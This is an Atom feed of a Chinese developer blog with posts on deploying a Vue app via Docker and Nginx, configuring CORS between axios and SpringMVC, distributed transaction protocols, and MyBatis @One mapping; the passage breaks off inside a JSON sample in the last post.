<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Amosannn</title>
  
  <subtitle>Amo&#39;s binary space</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://amosannn.github.io/"/>
  <updated>2018-03-28T09:36:15.000Z</updated>
  <id>https://amosannn.github.io/</id>
  
  <author>
    <name>Amosannn</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Docker + Nginx 镜像部署 Vue 项目</title>
    <link href="https://amosannn.github.io/2018/03/28/deploy-the-vue-project-using-docker-and-nginx/"/>
    <id>https://amosannn.github.io/2018/03/28/deploy-the-vue-project-using-docker-and-nginx/</id>
    <published>2018-03-28T07:23:57.000Z</published>
    <updated>2018-03-28T09:36:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单介绍-Docker"><a href="#简单介绍-Docker" class="headerlink" title="简单介绍 Docker"></a>简单介绍 Docker</h1><p>Docker 真是个好东西，很好的降低了不同环境发版的兼容性问题。无论是 Linux, Windows 或是 Mac OS，再也不用怕系统环境不同，软件版本不同导致的项目无法启动。这些问题只需要自定义 Docker 镜像，并在 Docker 中启动，就能搞定部署啦。</p><h1 id="部署-Vue-项目"><a href="#部署-Vue-项目" class="headerlink" title="部署 Vue 项目"></a>部署 Vue 项目</h1><p>传统的部署一般为编译后放在 Nginx 目录下，或者放在 Tomcat 目录下。玩了有一阵子 Docker 了，就试试用 Docker 来部署吧。</p><h2 id="本地操作"><a href="#本地操作" class="headerlink" title="本地操作"></a>本地操作</h2><p>首先给本地的vue项目打包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>执行命令之后项目根目录下会出现 dist 文件夹，将其上传至服务器。</p><h2 id="服务器操作"><a href="#服务器操作" class="headerlink" title="服务器操作"></a>服务器操作</h2><h3 id="编写-Dockerfile"><a href="#编写-Dockerfile" class="headerlink" title="编写 Dockerfile"></a>编写 Dockerfile</h3><p>新建 Dockerfile</p><blockquote><p>vi Dockerfile</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#导入nginx镜像</span><br><span class="line">FROM nginx:1.13.7</span><br><span class="line">MAINTAINER amosannn &lt;amosannn@gmail.com&gt;</span><br><span class="line">#把当前打包工程的html复制到虚拟地址</span><br><span class="line">COPY dist/ /usr/share/nginx/html/</span><br><span class="line">#使用自定义nginx.conf配置端口和监听</span><br><span class="line">RUN rm /etc/nginx/conf.d/default.conf</span><br><span class="line">ADD default.conf /etc/nginx/conf.d/</span><br><span class="line"></span><br><span class="line">RUN /bin/bash -c &apos;echo init ok!!!&apos;</span><br></pre></td></tr></table></figure><h3 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置"></a>Nginx配置</h3><p>新建<code>default.conf</code></p><blockquote><p>vi default.conf</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line"># 项目中定义的端口号</span><br><span class="line">    listen       8000; </span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  /var/log/nginx/log/host.access.log  main;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Docker-打包"><a href="#Docker-打包" class="headerlink" title="Docker 打包"></a>Docker 打包</h3><p>打包前项目目录下应该有这几个文件(夹)：<code>default.conf</code>,<code>dist</code>,<code>Dockerfile</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t zhiliao:v1 .</span><br></pre></td></tr></table></figure><p>别忘了末尾的小点点</p><p>最后出现这两条提示即为打包成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Successfully built 6f656946fde3</span><br><span class="line">Successfully tagged zhiliao:v1</span><br></pre></td></tr></table></figure><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>如果在结果中看到，则为打包成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">zhiliao             latest              c5d9c47be079        17 minutes ago      111MB</span><br></pre></td></tr></table></figure><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:8000 zhiliao:v1</span><br></pre></td></tr></table></figure><p>命令中的<code>-d</code>意为后台运行</p><p>-p 为端口号，前半部分为外网访问的端口，后半部分为 Nginx 反向代理寻找的内部端口</p><h3 id="查看运行结果"><a href="#查看运行结果" class="headerlink" title="查看运行结果"></a>查看运行结果</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>这条命令等价于<code>docker container ls</code>，加上 -a 则可显示全部</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_108_54_centos zhiliao-vue]# docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                      PORTS               NAMES</span><br><span class="line">bdd5842a4cae        zhiliao:v1          "nginx -g 'daemon ..."   42 seconds ago      Exited (1) 41 seconds ago                       frosty_joliot</span><br></pre></td></tr></table></figure><h3 id="查找日志"><a href="#查找日志" class="headerlink" title="查找日志"></a>查找日志</h3><p>如果遇到程序崩溃或者镜像启动失败</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs 'CONTAINER ID'</span><br></pre></td></tr></table></figure><p>使用 ps 命令可以找到到 <code>CONTAINER ID</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_108_54_centos zhiliao-vue]# docker logs bdd5842a4cae</span><br><span class="line">2018/03/28 07:11:51 [emerg] 1#1: unknown directive "//这里使用项目中的端口号" in /etc/nginx/conf.d/default.conf:3</span><br><span class="line">nginx: [emerg] unknown directive "//这里使用项目中的端口号" in /etc/nginx/conf.d/default.conf:3</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p><a href="https://yeasy.gitbooks.io/docker_practice/content/image/build.html" target="_blank" rel="noopener">使用 Dockerfile 定制镜像</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简单介绍-Docker&quot;&gt;&lt;a href=&quot;#简单介绍-Docker&quot; class=&quot;headerlink&quot; title=&quot;简单介绍 Docker&quot;&gt;&lt;/a&gt;简单介绍 Docker&lt;/h1&gt;&lt;p&gt;Docker 真是个好东西，很好的降低了不同环境发版的兼容性问题。无
      
    
    </summary>
    
    
      <category term="Docker" scheme="https://amosannn.github.io/tags/Docker/"/>
    
      <category term="Nginx" scheme="https://amosannn.github.io/tags/Nginx/"/>
    
      <category term="Vue" scheme="https://amosannn.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>解决Vue前后端分离跨域问题</title>
    <link href="https://amosannn.github.io/2018/03/22/solove-vue-cross-domain-problems/"/>
    <id>https://amosannn.github.io/2018/03/22/solove-vue-cross-domain-problems/</id>
    <published>2018-03-22T01:11:58.000Z</published>
    <updated>2018-03-22T05:17:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用Vue写了几个页面，发现request传到后端没带上cookies，心想不对劲，Postman明明可以访问啊。再仔细看看，后端已经开放了跨域访问，不需要<code>HttpServletRequest</code>的接口也可以成功请求。一定就是前端请求缺少请求头或是某些参数了。上网查了一下还真是这样，又跳过了一个坑，很开心啦～</p><h1 id="前后端跨域设置"><a href="#前后端跨域设置" class="headerlink" title="前后端跨域设置"></a>前后端跨域设置</h1><h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2><blockquote><p>main.js 设置</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"></span><br><span class="line">axios.defaults.withCredentials=<span class="literal">true</span>;</span><br><span class="line">Vue.prototype.$http = axios;</span><br></pre></td></tr></table></figure><blockquote><p>请求需带上withCredentials</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getData() &#123;</span><br><span class="line">        <span class="keyword">this</span>.$axios.get(<span class="string">'http://127.0.0.1:8080/xxx/xxxxx'</span>,&#123;</span><br><span class="line">          headers: &#123;</span><br><span class="line">            <span class="string">"Content-Type"</span>:<span class="string">"application/json;charset=utf-8"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          withCredentials : <span class="literal">true</span></span><br><span class="line">        &#125;).then( <span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span>( response.data.code === <span class="string">'0000'</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.items = response.data.data.xxx;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.items)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><p>加上一个跨域用Interceptor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CorsInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">      Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    response.setHeader(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br><span class="line">    response.setHeader(<span class="string">"Access-Control-Allow-Methods"</span>, <span class="string">"*"</span>);</span><br><span class="line">    response.setHeader(<span class="string">"Access-Control-Max-Age"</span>, <span class="string">"3600"</span>);</span><br><span class="line">    response.setHeader(<span class="string">"Access-Control-Allow-Headers"</span>, <span class="string">"Origin, X-Requested-With, Content-Type, Accept"</span>);</span><br><span class="line">    response.setHeader(<span class="string">"Access-Control-Allow-Credentials"</span>,<span class="string">"true"</span>); <span class="comment">//是否允许浏览器携带用户身份信息（cookie）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(<span class="string">"Access-Control-Allow-Origin"</span>, <span class="string">"*"</span>);</span><br></pre></td></tr></table></figure><p>请求源地址如果写了<code>*</code>很可能会被拒绝访问。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to load http://127.0.0.1:8080/zhiliao/login: Response to preflight request doesn't pass access control check: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'. Origin 'http://127.0.0.1:8000' is therefore not allowed access. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure><p>如果出现这样的报错，那就得指定地址啦！    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;http://127.0.0.1:8000&quot;);</span><br></pre></td></tr></table></figure><p>这里依旧有个小坑：指定地址为<code>http://127.0.0.1:8000</code>的时候前端页面若是<code>localhost</code>是无法访问的。</p><h1 id="看看axios官方文档"><a href="#看看axios官方文档" class="headerlink" title="看看axios官方文档"></a>看看axios官方文档</h1><p><a href="https://github.com/axios/axios#request-config" target="_blank" rel="noopener">axios官方配置说明</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// `timeout` specifies the number of milliseconds before the request times out.</span><br><span class="line">// If the request takes longer than `timeout`, the request will be aborted.</span><br><span class="line">timeout: 1000,</span><br><span class="line"></span><br><span class="line">// `withCredentials` indicates whether or not cross-site Access-Control requests</span><br><span class="line">// should be made using credentials</span><br><span class="line">withCredentials: false, // default</span><br><span class="line"></span><br><span class="line">// `adapter` allows custom handling of requests which makes testing easier.</span><br><span class="line">// Return a promise and supply a valid response (see lib/adapters/README.md).</span><br><span class="line">adapter: function (config) &#123;</span><br><span class="line">  /* ... */</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>配置文件中<code>withCredentials</code>默认是关闭的，手动修改配置文件或在项目中重定义即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;用Vue写了几个页面，发现request传到后端没带上cookies，心想不对劲，Postman明明可以访问啊。再仔细看看，后端已经开放了跨
      
    
    </summary>
    
    
      <category term="Vue" scheme="https://amosannn.github.io/tags/Vue/"/>
    
      <category term="SpringBoot" scheme="https://amosannn.github.io/tags/SpringBoot/"/>
    
      <category term="CORS" scheme="https://amosannn.github.io/tags/CORS/"/>
    
  </entry>
  
  <entry>
    <title>什么是分布式事务</title>
    <link href="https://amosannn.github.io/2018/03/19/simple-to-understand-transaction/"/>
    <id>https://amosannn.github.io/2018/03/19/simple-to-understand-transaction/</id>
    <published>2018-03-19T09:27:21.000Z</published>
    <updated>2018-03-19T10:46:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简单说一下事务"><a href="#简单说一下事务" class="headerlink" title="简单说一下事务"></a>简单说一下事务</h1><p>事务就是单个逻辑执行的一系列操作，要么全部成功，要么全部失败。<br>事务包含4个特性（<strong>ACID</strong>）：</p><ol><li>Atomicity（原子性）：事务中包含的所有操作要么全做，要么全不做。</li><li>Consistency（一致性）：事务开始以前，数据库处于一致性的状态，事务结束后，数据库也必须处于一致性的状态。</li><li>Isolation（隔离性）：系统必须保证事务不受其他并发执行的事务的影响。</li><li>Durability（持久性）：一个事务一旦成功完成，它对数据库的改变必须是永久的，即使是在系统遇到故障的情况下也不会丢失。</li></ol><h1 id="假如没有事务"><a href="#假如没有事务" class="headerlink" title="假如没有事务"></a>假如没有事务</h1><p>我们以银行的ATM机为例子：</p><p>取款操作一般为两个核心步骤：</p><ol><li>余额扣除相应金额</li><li>ATM机吐钞</li></ol><p>如果金额扣除了，而ATM机却因某些原因无法吐钞，那用户就崩溃了。而若是金额没扣除，ATM却吐钞了，那就是银行崩溃了。所以事务（分布式）的重要性在这里就体现的淋漓尽致了，这也正是事务中的一致性。</p><h1 id="说说分布式事务"><a href="#说说分布式事务" class="headerlink" title="说说分布式事务"></a>说说分布式事务</h1><p>分布式事务的体现有很多种，其中最具代表性的是由Oracle Tuxedo系统提出的XA分布式事务协议。</p><p>XA协议包含<strong>两阶段提交（2PC）</strong>和<strong>三阶段提交（3PC</strong>两种实现。</p><h2 id="两阶段提交（2PC）"><a href="#两阶段提交（2PC）" class="headerlink" title="两阶段提交（2PC）"></a>两阶段提交（2PC）</h2><p>两阶段提交就像支持多人游戏的网游游戏模式（可参考近日火热的PUBG）。</p><p>在游戏开始前，一个队伍中会有两种角色，队长与队员，也分别对应着<strong>事务协调者</strong>与<strong>事务参与者</strong>。</p><h3 id="正向流程"><a href="#正向流程" class="headerlink" title="正向流程"></a>正向流程</h3><p>一个XA两阶段提交的正向流程分为这两阶段：</p><blockquote><p>第一阶段：</p></blockquote><ol><li>以发送邀请的玩家A为首，邀请到了呵自己开黑的小伙伴B、C、D进入队伍，并请求他们点击准备按钮。</li><li>小伙伴 B、C、D 全部准备就绪。</li></ol><blockquote><p>第二阶段：</p></blockquote><ol><li>A 大吼一声，「伞兵一号准备就绪！」随即点击开始游戏。</li><li>A 首先进入游戏，等待 B、C、D片刻后，大家都成功进入游戏地图。</li></ol><p>对应到正经的XA中是这样的：</p><blockquote><p>第一阶段：</p></blockquote><ol><li><p>协调者向参与者们发送Prepare请求</p></li><li><p>参与者们各自执行自己与事务有关的数据更新，写入Undo Log和Redo Log。如果参与者执行成功，暂时不提交事务，而是向事务协调节点返回“Done”消息。</p><p>当事务协调者接到了所有参与者的返回消息，整个分布式事务将会进入第二阶段。</p></li></ol><blockquote><p>第二阶段：</p></blockquote><ol><li>如果事务协调节点在之前所收到都是正向返回，那么它将会向所有事务参与者发出Commit请求。</li><li>接到Commit请求之后，事务参与者节点会各自进行本地的事务提交，并释放锁资源。当本地事务完成提交后，将会向事务协调者返回“ACK”消息。</li><li>事务协调者接收到所有事务参与者的“完成”反馈，整个分布式事务完成。</li></ol><h3 id="失败处理"><a href="#失败处理" class="headerlink" title="失败处理"></a>失败处理</h3><ol><li>如果某个事务参与者反馈失败消息，说明该节点的本地事务执行不成功，必须回滚。</li><li>于是在第二阶段，事务协调节点向所有的事务参与者发送Abort请求。接收到Abort请求之后，各个事务参与者节点需要在本地进行事务的回滚操作，回滚操作依照Undo Log来进行。</li></ol><h2 id="XA两阶段提交的不足"><a href="#XA两阶段提交的不足" class="headerlink" title="XA两阶段提交的不足"></a>XA两阶段提交的不足</h2><blockquote><p>性能问题</p></blockquote><p>XA协议遵循强一致性。在事务执行过程中，各个节点占用着数据库资源，只有当所有节点准备完毕，事务协调者才会通知提交，参与者提交后释放资源。这样的过程有着非常明显的性能问题。</p><blockquote><p>协调者单点故障问题</p></blockquote><p>事务协调者是整个XA模型的核心，一旦事务协调者节点挂掉，参与者收不到提交或是回滚通知，参与者会一直处于中间状态无法完成事务。</p><blockquote><p>丢失消息导致的不一致问题</p></blockquote><p>在XA协议的第二个阶段，如果发生局部网络问题，一部分事务参与者收到了提交消息，另一部分事务参与者没收到提交消息，那么就导致了节点之间数据的不一致。</p><h3 id="如何避免XA两阶段提交的种种问题"><a href="#如何避免XA两阶段提交的种种问题" class="headerlink" title="如何避免XA两阶段提交的种种问题"></a>如何避免XA两阶段提交的种种问题</h3><p>有许多其他的分布式事务方案可供选择：</p><blockquote><p>XA三阶段提交</p></blockquote><p>XA三阶段提交在两阶段提交的基础上增加了CanCommit阶段，并且引入了超时机制。一旦事物参与者迟迟没有接到协调者的commit请求，会自动进行本地commit。这样有效解决了协调者单点故障的问题。但是性能问题和不一致的问题仍然没有根本解决。</p><blockquote><p>MQ事务</p></blockquote><p>利用消息中间件来异步完成事务的后一半更新，实现系统的最终一致性。这个方式避免了像XA协议那样的性能问题。</p><blockquote><p>TCC事务</p></blockquote><p>TCC事务是Try、Commit、Cancel三种指令的缩写，其逻辑模式类似于XA两阶段提交，但是实现方式是在代码层面来人为实现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简单说一下事务&quot;&gt;&lt;a href=&quot;#简单说一下事务&quot; class=&quot;headerlink&quot; title=&quot;简单说一下事务&quot;&gt;&lt;/a&gt;简单说一下事务&lt;/h1&gt;&lt;p&gt;事务就是单个逻辑执行的一系列操作，要么全部成功，要么全部失败。&lt;br&gt;事务包含4个特性（&lt;stron
      
    
    </summary>
    
    
      <category term="Transaction" scheme="https://amosannn.github.io/tags/Transaction/"/>
    
      <category term="SQL" scheme="https://amosannn.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>MyBatis一对一映射注解@One的使用及理解</title>
    <link href="https://amosannn.github.io/2018/03/08/the-use-and-understanding-of-one-annotated-by-mybatis/"/>
    <id>https://amosannn.github.io/2018/03/08/the-use-and-understanding-of-one-annotated-by-mybatis/</id>
    <published>2018-03-08T12:32:21.000Z</published>
    <updated>2018-03-08T15:35:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本着更深入地使用注解来开发，慢慢地发现脱离了XML的MyBatis好多好多的坑。我觉得很大的原因还是来自于官方文档的不完善，以及使用注解开发持久层的人并不多见，导致网络上的相关讨论过于贫瘠并重复化，毕竟对于复杂查询的支持，我认为还没有在XML里写一条SQL方便呢～  </p><p>所以这篇文章用于补充一语带过的官方文档，记录下自己趟过的坑。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="一对一映射"><a href="#一对一映射" class="headerlink" title="一对一映射"></a>一对一映射</h2><p>注解化一对一映射其实就是将XML中的<code>ResultType</code>属性对应的实体写在<code>@Results</code>注解中。其中的<code>@Result</code>填入实体的属性，而若该属性为实体中的实体，则需要@One注解引入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select</span>(<span class="string">"select answer_id, answer_content, liked_count, create_time, question_id, user_id from answer where create_time &gt; #&#123;createTime&#125; order by liked_count desc, create_time desc limit 0,10"</span>)</span><br><span class="line"><span class="meta">@Results</span>(&#123;</span><br><span class="line">    <span class="meta">@Result</span>(id = <span class="keyword">true</span>, column = <span class="string">"answer_id"</span>, property = <span class="string">"answerId"</span>, javaType = Integer.class),</span><br><span class="line">    <span class="meta">@Result</span>(column = <span class="string">"answer_content"</span>, property = <span class="string">"answerContent"</span>),</span><br><span class="line">    <span class="meta">@Result</span>(column = <span class="string">"liked_count"</span>, property = <span class="string">"likedCount"</span>, javaType = Integer.class, jdbcType = JdbcType.INTEGER),</span><br><span class="line">    <span class="meta">@Result</span>(column = <span class="string">"create_time"</span>, property = <span class="string">"createTime"</span>),</span><br><span class="line">    <span class="meta">@Result</span>(column = <span class="string">"question_id"</span>, property = <span class="string">"question"</span>, javaType = Question.class,</span><br><span class="line">        one = <span class="meta">@One</span>(select = <span class="string">"selectQuestionById"</span>)),</span><br><span class="line">    <span class="meta">@Result</span>(column = <span class="string">"user_id"</span>, property = <span class="string">"user"</span>,</span><br><span class="line">        one = <span class="meta">@One</span>(select = <span class="string">"selectUserById"</span>))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="function">List&lt;Answer&gt; <span class="title">listAnswerByCreateTime</span><span class="params">(@Param(<span class="string">"createTime"</span>)</span> <span class="keyword">long</span> createTime)</span>;</span><br></pre></td></tr></table></figure><p>值得注意的是，映射中的<code>property</code>属性的值不可和其他实体属性一样，应该填写所返回的实体名称。</p><p>例如下面代码，我返回的实体为<code>Answer</code>类下的<code>Question</code>类，则<code>property</code>中不可写<code>questionId</code>，而得写<code>question</code>。同时@One中select属性对应的方法若在不同类，则需要写出完整的包名（com.xxx.xxx.getxxxByxx）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Result</span>(column = <span class="string">"question_id"</span>, property = <span class="string">"question"</span>, javaType = Question.class,</span><br><span class="line">        one = <span class="meta">@One</span>(select = <span class="string">"selectQuestionById"</span>))</span><br></pre></td></tr></table></figure><p>需要注意的是，从@One传递过来的查询条件也需要在主查询语句中查询出来，也就是上面的<code>listAnswerByCreateTime</code>方法需要查询出question_id和user_id，千万别漏了。否则报你错哦！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select</span>(<span class="string">"select question_id, question_title from question where question_id = #&#123;questionId&#125;"</span>)</span><br><span class="line"><span class="meta">@ResultType</span>(Question.class)</span><br><span class="line"><span class="function">Question <span class="title">selectQuestionById</span><span class="params">(@Param(<span class="string">"questionId"</span>)</span> Integer questionId)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Select</span>(<span class="string">"select user_id, username, avatar_url, simple_desc from user where user_id = #&#123;userId&#125;"</span>)</span><br><span class="line"><span class="meta">@ResultType</span>(User.class)</span><br><span class="line"><span class="function">User <span class="title">selectUserById</span><span class="params">(@Param(<span class="string">"userId"</span>)</span> Integer userId)</span>;</span><br></pre></td></tr></table></figure><p>由此查询得出的结果集为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">"answerList": [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">"answerId"</span>: <span class="number">42</span>,</span><br><span class="line">                <span class="attr">"answerContent"</span>: <span class="string">"这是回答！"</span>,</span><br><span class="line">                <span class="attr">"likedCount"</span>: <span class="number">3</span>,</span><br><span class="line">                <span class="attr">"createTime"</span>: <span class="number">1520508016650</span>,</span><br><span class="line">                <span 